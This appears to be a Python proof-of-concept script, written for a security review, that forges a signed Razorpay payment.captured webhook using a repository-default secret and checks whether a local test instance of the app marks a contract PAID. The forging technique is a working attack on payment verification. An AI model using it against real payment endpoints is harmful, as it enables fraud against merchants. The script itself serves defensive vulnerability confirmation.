"""Adversarial verification of reviewer claim: default webhook secret stays
armed in live-test-mode, so a forged payment.captured signed with the repo-
public secret grants PAID on the PUBLIC /api/webhooks/razorpay intake.

Simulates the exact operator misconfiguration: RAZORPAY_KEY_ID/SECRET set,
RAZORPAY_WEBHOOK_SECRET left at repo default.
"""
from __future__ import annotations

import hashlib
import hmac
import json
import os
import sys
import tempfile
import uuid
from pathlib import Path

_API_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(_API_ROOT))

# Isolated store for this run.
os.environ["DANTE_STORE_PATH"] = os.path.join(tempfile.mkdtemp(), "verify-store.json")

# --- the claimed misconfiguration -------------------------------------------
os.environ["RAZORPAY_KEY_ID"] = "rzp_test_1DP5mmOlF5G5ag"
os.environ["RAZORPAY_KEY_SECRET"] = "someRealTestSecretNotInRepo"
# RAZORPAY_WEBHOOK_SECRET deliberately NOT set -> pydantic default applies.

from fastapi.testclient import TestClient  # noqa: E402

from project_dante.api.app import app  # noqa: E402
from project_dante.db.store import STORE  # noqa: E402
from project_dante.settings import get_settings  # noqa: E402

settings = get_settings()
assert settings.razorpay_live_test_mode is True, "precondition: live-test-mode"
assert settings.razorpay_webhook_secret == "dante-dev-webhook-secret", (
    "precondition: secret left at repo default"
)
print(f"mode check: razorpay adapter reports live-test-mode="
      f"{settings.razorpay_live_test_mode}; webhook secret at default: "
      f"{settings.razorpay_webhook_secret == 'dante-dev-webhook-secret'}")

SECRET = "dante-dev-webhook-secret"  # from public repo / .env.example


def sign(body: bytes) -> str:
    return hmac.new(SECRET.encode(), body, hashlib.sha256).hexdigest()


def seed_contract() -> dict:
    contract_id = f"con_verify_{uuid.uuid4().hex[:8]}"
    order_id = f"order_verify_{uuid.uuid4().hex[:8]}"
    STORE.put(
        {
            "_type": "contract",
            "id": contract_id,
            "intent_id": f"int_{contract_id}",
            "offer_id": f"off_{contract_id}",
            "razorpay_order_id": order_id,
            "razorpay_payment_id": None,
            "amount_paise": 1149900,
            "currency": "INR",
            "status": "PAYMENT_PENDING",
        }
    )
    return STORE.get(contract_id)


contract = seed_contract()
order_id = contract["razorpay_order_id"]

body = json.dumps(
    {
        "event": "payment.captured",
        "payload": {
            "payment": {
                "entity": {
                    "id": "pay_FORGED",
                    "order_id": order_id,
                    "amount": 1149900,  # attacker echoes contract amount
                    "currency": "INR",
                    "status": "captured",
                }
            }
        },
    }
).encode("utf-8")

client = TestClient(app)

# Control: unsigned body must be rejected.
r0 = client.post("/api/webhooks/razorpay", content=body, headers={})
print(f"control (no signature): HTTP {r0.status_code} {r0.json()}")

# Attack: forged body hand-signed with the repo-public default secret.
r1 = client.post(
    "/api/webhooks/razorpay",
    content=body,
    headers={"X-Razorpay-Signature": sign(body), "X-Razorpay-Event-Id": f"evt_forged_{uuid.uuid4().hex[:8]}"},
)
print(f"attack  (forged sig):   HTTP {r1.status_code} {r1.json()}")

after = STORE.get(contract["id"])
paid = after.get("status") == "PAID"
payment_id = after.get("razorpay_payment_id")
print(f"contract after attack: status={after.get('status')} "
      f"razorpay_payment_id={payment_id}")

if paid and payment_id == "pay_FORGED":
    print("VERDICT: CONFIRMED — forged webhook granted PAID in live-test-mode "
          "with repo-default secret.")
else:
    print("VERDICT: NOT CONFIRMED — contract did not reach PAID via forgery.")
